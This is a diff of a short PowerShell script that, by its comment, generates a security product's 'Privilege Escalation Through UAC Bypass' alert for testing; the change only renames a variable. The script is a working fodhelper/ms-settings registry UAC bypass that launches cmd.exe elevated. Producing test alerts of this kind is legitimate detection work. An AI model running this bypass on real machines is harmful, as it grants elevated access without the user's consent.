@@ -1,10 +1,10 @@
 #This script helps to generate C1WS "Privilege Escalation Through UAC Bypass" workbench
 
-$yourevilcommand = "C:\Windows\System32\cmd.exe"
+$krishcommand = "C:\Windows\System32\cmd.exe"
 
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $krishcommand -Force
 
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
